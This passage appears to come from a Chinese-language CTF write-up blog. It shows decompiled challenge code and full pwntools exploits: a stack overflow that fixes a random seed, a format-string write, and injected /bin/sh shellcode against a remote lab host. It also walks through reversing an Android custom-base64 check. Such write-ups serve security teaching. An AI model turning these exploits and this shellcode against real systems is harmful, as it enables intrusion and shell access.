class="string">&#x27;;a&#x27;</span>;*<span class="number">0x14</span></span><br><span class="line">payload += <span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x4</span></span><br><span class="line">payload += p32(what_is_this)</span><br><span class="line">payload = payload.ljust(<span class="number">256</span>+<span class="number">6</span>,<span class="string">&#x27;;b&#x27;</span>;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;;choice:&#x27;</span>;,<span class="string">&#x27;;1&#x27;</span>;)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;;username:&#x27;</span>;,<span class="string">&#x27;;author_skye&#x27;</span>;)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;;passwd:&#x27;</span>;)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考察点：利用栈溢出固定随机数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to a guess number game!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please let me know your name!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name:&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  gets((__int64)&amp;amp;v7);<span class="comment">//栈溢出</span></span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &amp;lt;= <span class="number">9</span>; ++i )                    <span class="comment">// 连续正确10次</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------------Turn:%d-------------\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your guess number:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;amp;v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;---------------------------------&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;GG!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于题目开启 Canary 不能直接控制 eip ，观察栈空间发现 v7 位于 seed 前面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-000000000000003C var_3C          dd ?</span><br><span class="line">-0000000000000038 var_38          dd ?</span><br><span class="line">-0000000000000034 var_34          dd ?</span><br><span class="line">-0000000000000030 v7              db ?</span><br><span class="line">-000000000000002F                 db ? ; undefined</span><br><span class="line">-000000000000002E                 db ? ; undefined</span><br><span class="line">…………</span><br><span class="line">…………</span><br><span class="line">-0000000000000010 seed            dd 2 dup(?)</span><br><span class="line">-0000000000000008 var_8           dq ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br></pre></td></tr></table></figure><p>随机数的随机性是基于 seed 种子，当固定 seed 时，实际上生成的是伪随机数，也就是一个固定的值。这道题几时利用 gets 造成栈溢出覆盖 seed 固定生成随机数，配合 ctypes 库实现 python、c 混合编程。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.198.29.45&quot;</span>,<span class="number">57280</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;;./b59204f56a0545e8a22f8518e749f19f&#x27;;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;;Your name:&#x27;</span>;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">num = <span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;;number:&#x27;</span>;)</span><br><span class="line">p.sendline(num)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：格式化字符串任意地址写小数</strong></p><p>题目前面有几个条件循环绕过，反编译就能看出，不再赘述。看漏洞函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400BB9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You travel a short distance east.That&#x27;;s odd, anyone disappear suddenly&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;, what happend?! You just travel , and find another hole&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>);</span><br><span class="line">  _isoc99_scanf((__int64)<span class="string">&quot;%d&quot;</span>, (__int64)&amp;amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;A voice heard in your mind&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&#x27;;Give me an address&#x27;;&quot;</span>);</span><br><span class="line">    _isoc99_scanf((__int64)<span class="string">&quot;%ld&quot;</span>, (__int64)&amp;amp;v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And, you wish is:&quot;</span>);</span><br><span class="line">    _isoc99_scanf((__int64)<span class="string">&quot;%s&quot;</span>, (__int64)&amp;amp;format);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your wish is&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;amp;format, &amp;amp;format);                   <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I hear it, I hear it....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可控制的第一个参数是在 18 行，偏移为 7 。这里利用方式有多种，利用偏移 7 和 8 控制任意写入，也可只利用偏移 8 任意输入。（exp 使用偏移 7 和 8）</p><p>修改 v3 值后，绕过最后一个障碍。然后写入一段 shellcode 即可。shellcraft 生成的没有效果，就去 <a href="http://shell-storm.org/">http://shell-storm.org/</a> 找了一个。</p><p>完整 exp ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.198.29.45&quot;</span>,<span class="number">48602</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./string&quot;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">v3 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;;\n&#x27;</span>;,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;v3:&quot;</span>+<span class="built_in">hex</span>(v3))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;secret[1] is &quot;</span>)</span><br><span class="line">v3_1 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;;\n&#x27;</span>;,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;v3_1:&quot;</span>+<span class="built_in">hex</span>(v3_1))</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &quot;aaaaaaaa%p%p%p%p%p%p%p%p%p&quot;</span></span><br><span class="line"><span class="comment">#offset = 7</span></span><br><span class="line">payload = <span class="string">&quot;%85c%7$n&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;;a&#x27;</span>;*<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;up?:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;east&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;leave(0)?:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;address&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(v3))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;is:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%85c%7$n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br><span class="line">shellcode = <span class="string">&quot;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;USE YOU SPELL&quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2><h3 id="eastjni"><a href="#eastjni" class="headerlink" title="eastjni"></a>eastjni</h3><p><strong>考点：自定义密码表base加密、so</strong></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>前面的怎么定位 java 层关键位置就略过，查一下错误弹窗就能找到。</p><p>输入字符串会作为 mainactivity/a 的参数输入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">a</span><span class="params">(String paramString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        a locala = <span class="keyword">new</span> com/a/easyjni/a;</span><br><span class="line">        locala.&lt;init&gt;();</span><br><span class="line">        bool = ncheck(locala.a(paramString.getBytes()));</span><br><span class="line">        <span class="keyword">return</span> bool;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception paramString)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">boolean</span> bool = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后又作为 com/a/easyjni/a 的参数输入，到达第一层加密：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span>[] a = &#123; <span class="number">105</span>, <span class="number">53</span>, <span class="number">106</span>, <span class="number">76</span>, <span class="number">87</span>, <span class="number">55</span>, <span class="number">83</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">54</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">118</span>, <span class="number">51</span>, <span class="number">110</span>, <span class="number">121</span>, <span class="number">52</span>, <span class="number">113</span>, <span class="number">56</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">50</span>, <span class="number">81</span>, <span class="number">43</span>, <span class="number">98</span>, <span class="number">100</span>, <span class="number">107</span>, <span class="number">89</span>, <span class="number">103</span>, <span class="number">75</span>, <span class="number">79</span>, <span class="number">73</span>, <span class="number">84</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">85</span>, <span class="number">114</span>, <span class="number">70</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">80</span>, <span class="number">122</span>, <span class="number">104</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">72</span>, <span class="number">67</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">112</span>, <span class="number">69</span>, <span class="number">97</span>, <span class="number">74</span>, <span class="number">82</span>, <span class="number">90</span>, <span class="number">78</span> &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">a</span><span class="params">(<span class="keyword">byte</span>[] paramArrayOfByte)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    StringBuilder localStringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= paramArrayOfByte.length - <span class="number">1</span>; i += <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (j &lt;= <span class="number">2</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (i + j &lt;= paramArrayOfByte.length - <span class="number">1</span>) &#123;</span><br><span class="line">          arrayOfByte[j] = ((<span class="keyword">byte</span>)(<span class="keyword">byte</span>)(k | (paramArrayOfByte[(i + j)] &amp; <span class="number">0xFF</span>) &gt;&gt;&gt; j * <span class="number">2</span> + <span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (k = (<span class="keyword">byte</span>)(((paramArrayOfByte[(i + j)] &amp; <span class="number">0xFF</span>) &lt;&lt; (<span class="number">2</span> - j) * <span class="number">2</span> + <span class="number">2</span> &amp; <span class="number">0xFF</span>) &gt;&gt;&gt; <span class="number">2</span>);; k = <span class="number">64</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          j++;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">          arrayOfByte[j] = ((<span class="keyword">byte</span>)k);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      arrayOfByte[<span class="number">3</span>] = ((<span class="keyword">byte</span>)k);</span><br><span class="line">      k = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (k &lt;= <span class="number">3</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (arrayOfByte[k] &lt;= <span class="number">63</span>) &#123;</span><br><span class="line">          localStringBuilder.append(a[arrayOfByte[k]]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">          k++;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">          localStringBuilder.append(<span class="string">&#x27;=&#x27;</span>);<span class="comment">//base</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> localStringBuilder.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每一个字符都进行一次加密，每轮加密都会有 &amp; 、&gt;&gt; 操作，且最后会加上 == ，推断是 base 加密。然后根据密码表 a 判断是自定义密码表的 base 加密方式。</p><p>第一次加密完成后的返回值作为 ncheck 的参数，这是一个加载的 so 中的函数：<code>System.loadLibrary(&quot;native&quot;);</code>。分析这个函数需要到 so 文件里面，so 文件在 lib/armeabi-v7a/libnative.so 。</p><p>进入到 ncheck 函数后，再进行两次加密，分别是：前 16 位与后 16 位互换；前 1 位与后 1 位互换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __fastcall <span class="title">Java_com_a_easyjni_MainActivity_ncheck</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">…………</span><br><span class="line">  v6 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="number">676</span>))(a1, a3, <span class="number">0</span>);<span class="comment">// 字符串传递给a1，a1指针取值到v6</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v6) == <span class="number">32</span> )                       <span class="comment">// base加密长度限制32位</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = &amp;s1[v7];                             <span class="comment">// s1[0]指针给v8</span></span><br><span class="line">      s1[v7] = v6[v7 + <span class="number">16</span>];                     <span class="comment">// s1[0]=v6[16]</span></span><br><span class="line">      v9 = v6[v7++];</span><br><span class="line">      v8[<span class="number">16</span>] = v9;                              <span class="comment">// s1[0+16]=v6[0]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v7 != <span class="number">16</span> );                         <span class="comment">// 循环16次，每次操作两个数</span></span><br><span class="line">                                                <span class="comment">// 相当于将前16位于后16位对调</span></span><br><span class="line">    (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> *))(*(_DWORD *)v4 + <span class="number">680</span>))(v4, v5, v6);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v12 = __OFSUB__(v10, <span class="number">30</span>);</span><br><span class="line">      v11 = v10 - <span class="number">30</span> &lt; <span class="number">0</span>;</span><br><span class="line">      v16 = s1[v10];</span><br><span class="line">      s1[v10] = s1[v10 + <span class="number">1</span>];                    <span class="comment">// s1[0]=s1[1]</span></span><br><span class="line">      s1[v10 + <span class="number">1</span>] = v16;                        <span class="comment">// s1[1]=s1[0]</span></span><br><span class="line">      v10 += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 ^ v12 );                        <span class="comment">// 相当于前一位与后一位对调位置</span></span><br><span class="line">    v13 = <span class="built_in">memcmp</span>(s1, <span class="string">&quot;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&quot;</span>, <span class="number">0x20</span>u);<span class="comment">//与密文比较</span></span><br><span class="line">…………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>首先将密文：<code>MbT3sQgX039i3g==AQOoMQFPskB1Bsc7</code> 还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#手动完成前后 16 位互换</span></span><br><span class="line">c = <span class="built_in">list</span>(<span class="string">&quot;AQOoMQFPskB1Bsc7MbT3sQgX039i3g==&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">2</span>):</span><br><span class="line">v9 = c[i]</span><br><span class="line">c[i] = c[i+<span class="number">1</span>]</span><br><span class="line">c[i+<span class="number">1</span>] = v9</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">print(<span class="string">&quot;flag:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line"><span class="comment">#flag:QAoOQMPFks1BsB7cbM3TQsXg30i9g3==</span></span><br></pre></td></tr></table></figure><p>然后实现自定义密码表 base 解码，我找到的一个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 